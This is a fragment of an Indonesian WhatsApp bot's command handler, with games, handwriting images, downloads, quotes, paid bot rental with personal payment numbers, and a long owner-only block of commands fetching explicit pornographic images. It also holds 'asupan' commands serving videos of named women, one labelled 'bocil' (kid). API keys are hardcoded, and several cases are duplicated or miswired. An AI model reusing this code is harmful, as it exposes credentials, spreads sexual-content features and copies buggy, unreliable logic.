					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/caklontong?apikey=ae0184cfdb19e8c46728a104`, {method: 'get'})
					caklontong = `*${anu.result.question}*`
					setTimeout( () => {
					Dhani.sendMessage(from, '*Jawaban :* '+anu.result.answer, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, '_10 Detik lagi_', text, {quoted: mek}) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, '_20 Detik lagi_', text, {quoted: mek}) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, '_30 Detik lagi_', text, {quoted: mek}) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, caklontong, text, {quoted: mek}) // ur cods
					}, 0) // 1000 = 1s,
					break
case 'artinama':
if (args.length < 1) return reply('*Teks nya mana?*') 
					if (args.length < 1) return reply('Apa yang mau dicari um?')
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/arti?nama=${body.slice(6)}`, {method: 'get'})
					reply('Menurut nama:\n\n'+anu.result)
					break
case 'suit':
  if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 😔",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙂",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri 😏"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 😔",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙂",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 😏"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang ??",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙂",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri 😏"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
//══════════[ FITUR NULIS ]══════════//
case 'nulis':    
if (args.length < 1) return reply('*Teks nya mana?*') 
catat = args.join(" ")
reply(mess.wait)
catat = await getBuffer(`https://api.zeks.me/api/nulis?text=${catat}&apikey=apivinz`)
   Dhani.sendMessage(from, catat, image, { quoted:mek,caption:'Nih Ngab' })
   break
case 'nuliskiri': 
if (args.length < 1) return reply('*Teks nya mana?*') 
catat = args.join(" ")
reply(mess.wait)
catat = await getBuffer(`https://api.zeks.me/api/nulis?text=${catat}&apikey=apivinz`)
   Dhani.sendMessage(from, catat, image, { quoted:mek,caption:'Nih Ngab' })
   break
case 'nuliskanan': 
if (args.length < 1) return reply('*Teks nya mana?*') 
catat = args.join(" ")
reply(mess.wait)
catat = await getBuffer(`https://api.zeks.me/api/nulis?text=${catat}&apikey=apivinz`)
   Dhani.sendMessage(from, catat, image, { quoted:mek,caption:'Nih Ngab' })
   break
case 'foliokiri':{

                if (!q) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
                
                reply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 10).join('\n')
                spawn('convert', [
                    './temp/nulis/images/folio/sebelumkiri.jpg',
                    '-font',
'./temp/nulis/font/Indie-Flower.ttf',
                    '-size',
'3200x2180',
                     '-pointsize',
'55',
                     '-interline-spacing',
'2',
                     '-annotate',
'+80+390',
                    fixHeight,
'./temp/nulis/images/folio/setelahkiri.jpg'
                ])
                .on('error', () => reply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    Dhani.sendMessage(from, fs.readFileSync('./temp/nulis/images/folio/setelahkiri.jpg'), image, {quoted: mek, caption: `Nih...`})
                })
            }
break
case 'foliokanan':{

                if (!q) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
                
                reply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 10).join('\n')
                spawn('convert', [
                    './temp/nulis/images/folio/sebelumkiri.jpg',
                    '-font',
'./temp/nulis/font/Indie-Flower.ttf',
                    '-size',
'3200x2180',
                     '-pointsize',
'55',
                     '-interline-spacing',
'2',
                     '-annotate',
'+80+390',
                    fixHeight,
'./temp/nulis/images/folio/setelahkiri.jpg'
                ])
                .on('error', () => reply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    Dhani.sendMessage(from, fs.readFileSync('./temp/nulis/images/folio/setelahkiri.jpg'), image, {quoted: mek, caption: `Nih...`})
                })
            }
break
//══════════[ SEWA DLL ]══════════//

case 'sewabot':
menu =
`*${ucapanWaktu} @${sender.split('@')[0]}*
             
         🌹Sewa Bot🌹
    
🔖1 Minggu : 5.000 ( 5K )*
🔖1 Bulan : 10.000 ( 10K )*
🔖Permanen : 15.000 ( 15K )*`
teks =
`*${tanggal}*`
Dhani.sendMessage(from, { contentText: `${menu}`, footerText: `${teks}`, buttons: [{ buttonId: `${prefix}menu`, buttonText: { displayText: 'ᴍᴇɴᴜ' }, type: 1 },{ buttonId: `${prefix}owner`, buttonText: { displayText: 'ᴏᴡɴᴇʀ' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: fakeimage, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
break
case 'bayar':
case 'payment':
gambar = fs.readFileSync('./media/sewa.jpg')
menunya = `🌹Payment 🌹

🔖Gopay : _Silakan scan qr di atas_
🔖Dana : _081584850284_
🔖Ovo : _089522632509_
🔖Pulsa : _081584850284_`
teks =
`${tanggal}\n${runtime(process.uptime())}\n*「 ${botname} 」*`
but = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: 'ᴍᴇɴᴜ' }, type: 1 },
          { buttonId: `${prefix}owner`, buttonText: { displayText: 'ᴏᴡɴᴇʀ' }, type: 1 }
        ]
        sendButImage(from, menunya, teks, gambar, but)
break

//══════════[ FITUR DOWNLOAD ]══════════//

case 'ytmp3':
if (args.length < 1) return reply("Masukkan url youtube")
url = args.join(' ')
anu = await fetchJson(`https://apidhani.herokuapp.com/api/download/ytmp3?url=${url}&apikey=${dhakey}`)
ytmp3 = await getBuffer(anu.result.url)
reply(`_audio sedang diproses, silahkan tunggu beberapa saat lagi_`)
Dhani.sendMessage(from, ytmp3, audio, {mimetype:"audio/mp4", quoted:mek})
break
case 'ytmp4':
if (args.length < 1) return reply("Masukkan url youtube")
url = args.join(' ')
anu = await fetchJson(`https://apidhani.herokuapp.com/api/download/ytmp4?url=${url}&apikey=${dhakey}`)
ytmp4 = await getBuffer(anu.result.url)
reply(`_video sedang diproses, silahkan tunggu beberapa saat lagi_`)
Dhani.sendMessage(from, ytmp4, video, {caption:`Done kak`, thumbnail:Buffer.alloc(0), quoted:mek})
break
case 'joox':
try{
if(!q)return reply(`Judul lagu nya mana?`)
reply((mess.wait))
jx = await fetchJson(`https://api.zeks.me/api/joox?apikey=apivinz&q=${q}`)
jxx = `🌹 *JOOX DOWNLOADER*🌹

🔖 *Size* : ${jx.data[0].size}
🔖 *Judul* : ${jx.data[0].judul}
🔖 *Url* : ${jx.data[0].audio}
🔖 *Album* : ${jx.data[0].album}
`
sendMediaURL(from,jx.data[0].thumb,(jxx))
sendMediaURL(from,jx.data[0].audio)
} catch (e) {
reply(e)
console.log(e)
}
break
case 'tiktoknowm':             
             if (!q) return reply('Linknya?')
             if (!q.includes('tiktok.com')) return reply(mess.error.Iv)
             reply(mess.wait)
             anu = await TiktokDownloader(`${q}`)
            .then((data) => { sendMediaURL(from, data.result.nowatermark) })
            .catch((err) => { reply(String(err)) })
             break
//══════════[ FITUR NSFW]══════════//
case 'nsfwfutanari':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/futanari?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwholoero':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/holoEro?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwholo':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/holo?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwketa':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/keta?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwkemonomimi':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/kemonomimi?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwpussyart':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/pussyart?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwgirlsolo':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/girl_solo?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwtits':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/tits?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwanal':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/anal?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwbj':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/bj?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwboobs':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/boobs?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfweroyuri':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/eroyuri?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwcumsluts':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/cumsluts?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwneko':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/neko?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwpoke':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/sfw/poke?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwero':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/ero?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwclassic':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/classic?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwavatar':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/avatar2?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwkuni':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/kuni?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwlesbian':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/lesbian?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwblowjob':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/blowJob?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwkitsune':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/kitsune?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwfemdom':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/femdom?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwerofeet':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/erofeet?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwfeet':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/feet?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfweroneko':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/eroneko?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfweroyuri':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/eroyuri?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwcumarts':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/cumarts?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwspank':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/nsfw/spank?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwsmug':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/sfw/smug?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwbaka':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/sfw/baka?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwtickle':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 reply(mess.wait)
 await getBuffer (`https://api-alphabot.herokuapp.com/api/sfw/tickle?apikey=Alphabot`).then((gambar)=>{
Dhani.sendMessage(from, gambar, image, { quoted: ftrol })
})
break
case 'nsfwpussy':
				    try {
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					reply(mess.wait)
						axios.get(`https://nekos.life/api/v2/img/pussy_jpg`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = Buffer.from(response, 'base64');
					Dhani.sendMessage(from, buf, image, {quoted: mek,caption: "*INGAT ADA TUHAN KAK*"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('*ERROR*')
					}
					break
case 'nsfwtrap':
				    try {
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					reply(mess.wait)
						axios.get(`https://nekos.life/api/v2/img/pussy_jpg`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = Buffer.from(response, 'base64');
					Dhani.sendMessage(from, buf, image, {quoted: mek,caption: "*INGAT ADA TUHAN KAK*"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('*ERROR*')
					}
					break
case 'nsfwhentai':
				    try {
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					reply(mess.wait)
						axios.get(`https://nekos.life/api/v2/img/hentai`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = Buffer.from(response, 'base64');
					Dhani.sendMessage(from, buf, image, {quoted: mek,caption: "*INGAT ADA TUHAN KAK*"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('*ERROR*')
					}
					break
//══════════[ FITUR ASUPAN ]══════════//
case 'asupan':
case 'bocil':
case 'rikagusriani':
case 'santuy':
case 'ukhty':
case 'gheayubi':
case 'nantalia':
reply(mess.wait)
asupan = await getBuffer(`https://apidhani.herokuapp.com/api/asupan/${command}?apikey=${dhakey}`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'chika':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/chika?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'gheayubi':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/geayubi?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'rikagusriani':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/rikagusriani?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'mangayutri':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/mangayutri?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'alcakenya':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/alcakenya?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'hijaber':
reply(mess.wait)
asupan = await getBuffer(`https://apidhani.herokuapp.com/api/asupan/hijaber?apikey=${dhakey}`)
Dhani.sendMessage(from, asupan, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'delvira':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/delvira?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'ayu':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/ayu?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'bunga':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/bunga?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'aura':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/aura?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'nisa':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/nisa?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'ziva':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/ziva?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'yana':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/yana?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'viona':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/viona?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'syania':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/syania?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'riri':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/riri?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'mamagina':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/mama_gina?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'mangayutri':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/mangayutri?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break
case 'rikagusriani':
reply(mess.wait)
asupan = await getBuffer(`https://api-alphabot.herokuapp.com/api/asupan/rikagusriani?apikey=Alphabot`)
Dhani.sendMessage(from, asupan, video, {quoted: mek, caption: '_Nih Kak_'})
break

//══════════[ FITUR CECAN ]══════════//

case 'cecan':
case 'cogan':
case 'indonesia':
case 'vietnam':
case 'thailand':
case 'korea':
case 'china':
case 'japan':
case 'malaysia':
cecan = await getBuffer(`https://apidhani.herokuapp.com/api/cecan/${command}?apikey=${dhakey}`)
Dhani.sendMessage(from, cecan, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'malaysia':
cecan = await getBuffer(`https://api-alphabot.herokuapp.com/api/cecan/malaysia?apikey=Alphabot`)
Dhani.sendMessage(from, cecan, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'jenni':
cecan = await getBuffer(`https://api-alphabot.herokuapp.com/api/cecan/jenni?apikey=Alphabot`)
Dhani.sendMessage(from, cecan, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'jiso':
cecan = await getBuffer(`https://api-alphabot.herokuapp.com/api/cecan/jiso?apikey=Alphabot`)
Dhani.sendMessage(from, cecan, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'lisa':
cecan = await getBuffer(`https://api-alphabot.herokuapp.com/api/cecan/lisa?apikey=Alphabot`)
Dhani.sendMessage(from, cecan, image, {quoted: mek, caption: '_Nih Kak_'})
break
case 'rose':
cecan = await getBuffer(`https://api-alphabot.herokuapp.com/api/cecan/rose?apikey=Alphabot`)
Dhani.sendMessage(from, cecan, image, {quoted: mek, caption: '_Nih Kak_'})
break
//══════════[ RANDOM TEXT ]══════════//

case 'pantun':
case 'puisi':
case 'faktaunik':
case 'katabijak':
case 'katailham':
case 'katasindiran':
case 'katabucin':
case 'katabucin2':
case 'quotesislami':
case 'quotesanime':
case 'truth':
case 'dare':
oke = await fetchJson(`https://apidhani.herokuapp.com/api/random/${command}?apikey=${dhakey}`)
dhani = (oke.result)
sendButMessage(from, dhani, `Klik Untuk Ke ${command} Selanjutnya`, [
{
buttonId: `${prefix + command}`,
buttonText: {
displayText: `ɴᴇxᴛ`,
},
type: 1,
},]);
break;
case 'quotes2':
quotes = body.slice(1)
const quo =['Lebih baik mengerti sedikit daripada salah mengerti.','Hampir semua pria memang mampu bertahan menghadapi kesulitan. Namun, jika Anda ingin menguji karakter sejati pria, beri dia kekuasaan.','Bila tekad seseorang kuat dan teguh, Tuhan akan bergabung dalam usahanya.','Penderitaan adalah pelajaran.','Ilmu pengetahuan tanpa agama adalah pincang.','Hidup itu seperti sebuah sepeda, agar tetap seimbang kita harus tetap bergerak.','Perbedaan masa lalu, sekarang, dan masa depan tak lebih dari ilusi yang keras kepala.','Sebuah meja, sebuah kursi, semangkuk buah, dan sebuah biola; apa lagi yang dibutuhkan agar seseorang bisa merasa bahagia?','Belas kasihanlah terhadap sesama, bersikap keraslah terhadap diri sendiri.','Cara paling baik untuk menggerakkan diri Anda ialah memberi tugas kepada diri sendiri.','Kita tidak boleh kehilangan semangat. Semangat adalah stimulan terkuat untuk mencintai, berkreasi dan berkeinginan untuk hidup lebih lama.','Manusia akan bahagia selama ia memilih untuk bahagia.','Saya tidak berharap menjadi segalanya bagi setiap orang. Saya hanya ingin menjadi sesuatu untuk seseorang.','Apabila sempurna akal seseorang, maka sedikit perkataannya.','Bahagialah orang yang dapat menjadi tuan untuk dirinya, menjadi kusir untuk nafsunya dan menjadi kapten untuk bahtera hidupnya.','Sahabat yang jujur lebih besar harganya daripada harta benda yang diwarisi dari nenek moyang.','Yang paling melelahkan dalam hidup adalah menjadi orang yang tidak tulus.','Terbuka untuk Anda, begitulah Tuhan memberi kita jalan untuk berusaha. Jangan pernah berfikir jalan sudah tertutup.','Penundaan adalah kuburan dimana peluang dikuburkan.','Cinta bukan saling menatap mata, namun melihat ke arah yang sama bersama-sama.','Kita adalah apa yang kita kerjakan berulang kali. Dengan demikian, kecemerlangan bukan tindakan, tetapi kebiasaan.','Jangan pernah mencoba menjadikan putra atau putri Anda menjadi seperti Anda. Diri Anda hanya cukup satu saja.','Jika Anda bisa membuat orang lain tertawa, maka Anda akan mendapatkan semua cinta yang Anda inginkan.','Masalah akan datang cepat atau lambat. Jika masalah datang, sambut dengan sebaik mungkin. Semakin ramah Anda menyapanya, semakin cepat ia pergi.','Kita tak bisa melakukan apapun untuk mengubah masa lalu. Tapi apapun yang kita lakukan bisa mengubah masa depan.','Kesabaran adalah teman dari kebijaksanaan.','Orang-orang kreatif termotivasi oleh keinginan untuk maju, bukan oleh keinginan untuk mengalahkan orang lain.','Dimanapun engkau berada selalulah menjadi yang terbaik dan berikan yang terbaik dari yang bisa kita berikan.','Kebencian seperti halnya cinta, berkobar karena hal-hal kecil.','Anda tidak perlu harus berhasil pada kali pertama.','Satu jam yang intensif, jauh lebih baik dan menguntungkan daripada bertahun-tahun bermimpi dan merenung-renung.','Hal terbaik yang bisa Anda lakukan untuk orang lain bukanlah membagikan kekayaan Anda, tetapi membantu dia untuk memiliki kekayaannya sendiri.','Tidak ada jaminan keberhasilan, tetapi tidak berusaha adalah jaminan kegagalan.','Aku tidak tahu kunci sukses itu apa, tapi kunci menuju kegagalan adalah mencoba membuat semua orang senang.']
const tes = quo[Math.floor(Math.random() * quo.length)]
Dhani.sendMessage(from, ''+tes+'\n\n_By : Dani Official._', text, { quoted: mek })
break;
case 'randomquotes':
anu = await fetchJson(`https://apidhani.herokuapp.com/api/random/quotes?apikey=${dhakey}`)
dhani = (anu.result.quotes)
sendButMessage(from, dhani, `Klik Untuk Ke Quotes Selanjutnya`, [
{
buttonId: `${prefix + command}`,
buttonText: {
displayText: `ɴᴇxᴛ`,
},
type: 1,
},]);
break;
case 'quoteskanye':
anu = await fetchJson(`https://apidhani.herokuapp.com/api/random/quotes/kanye?apikey=${dhakey}`)
dhani = (anu.result.text_id)
sendButMessage(from, dhani, `Klik Untuk Ke Quotes Selanjutnya`, [
{
buttonId: `${prefix + command}`,
buttonText: {
displayText: `ɴᴇxᴛ`,
},
type: 1,
},]);
break;

//══════════[ RANDOM IMAGE ]══════════//

case 'ppcp':
case 'ppcouple':
